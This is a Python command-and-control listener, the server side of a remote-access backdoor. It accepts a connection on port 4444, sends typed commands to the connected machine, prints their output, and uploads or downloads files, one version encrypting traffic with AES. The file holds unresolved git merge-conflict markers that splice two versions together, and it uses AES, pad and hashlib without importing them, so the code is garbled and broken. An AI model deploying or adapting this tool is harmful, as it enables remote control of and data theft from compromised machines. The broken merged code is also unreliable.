#!/usr/bin/env python3
import socket
import os

<<<<<<< HEAD
BIND_IP = "0.0.0.0"  # Listen on all interfaces
BIND_PORT = 4444     # Change to your preferred port
=======
# Configuration - CHANGE THIS KEY IN BOTH SCRIPTS!
KEY = b'ThisIsASecretKey1234567890abc!!'  # Must be 32 bytes
BIND_IP, BIND_PORT = "127.0.0.1", 4444

def encrypt(data):
    iv = os.urandom(16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(pad(data, AES.block_size))

def decrypt(data):
    iv = data[:16]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(data[16:]), AES.block_size)
>>>>>>> 9e90a79 (Save local changes before pulling updates)

def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((BIND_IP, BIND_PORT))
    server.listen(1)
<<<<<<< HEAD
    print(f"[+] C2 Listener started on {BIND_IP}:{BIND_PORT}")
=======
    print(f"[+] Encrypted C2 listening on {BIND_IP}:{BIND_PORT} (AES-256)")
>>>>>>> 9e90a79 (Save local changes before pulling updates)

    client, addr = server.accept()
    print(f"[+] Connection from {addr[0]}:{addr[1]}")

    try:
        while True:
            cmd = input("C2> ").strip()
<<<<<<< HEAD
            if not cmd:
                continue

            client.send(cmd.encode())

            # Exit session
            if cmd.lower() == "exit":
                print("[*] Closing connection.")
                break

            # Download file (server <- client)
            elif cmd.startswith("download "):
                file_name = cmd.split(" ", 1)[1]
                with open(file_name, "wb") as f:
                    while True:
                        data = client.recv(4096)
                        if b"UPLOAD_COMPLETE" in data:
                            data = data.replace(b"UPLOAD_COMPLETE", b"")
                            if data:
                                f.write(data)
                            print(f"[+] Received {file_name}")
                            break
                        f.write(data)
=======
            if not cmd: continue
            
            # File download (server -> client)
            if cmd.startswith("download "):
                file_path = cmd.split(maxsplit=1)[1]
                if os.path.exists(file_path):
                    with open(file_path, "rb") as f:
                        data = f.read()
                        client.send(encrypt(data))
                    print(f"[+] Sent {file_path} (SHA-256: {hashlib.sha256(data).hexdigest()})")
                else:
                    client.send(encrypt(b"File not found"))
            
            # File upload (client -> server)
            elif cmd.startswith("upload "):
                file_path = cmd.split(maxsplit=1)[1]
                client.send(encrypt(cmd.encode()))
                encrypted_data = client.recv(4096)
                with open(file_path, "wb") as f:
                    f.write(decrypt(encrypted_data))
                print(f"[+] Received {file_path}")
            
            # Regular commands
>>>>>>> 9e90a79 (Save local changes before pulling updates)
            else:
                # Print command output
                response = client.recv(4096).decode()
                print(response)

    finally:
        client.close()
        server.close()

if __name__ == "__main__":
    start_listener()
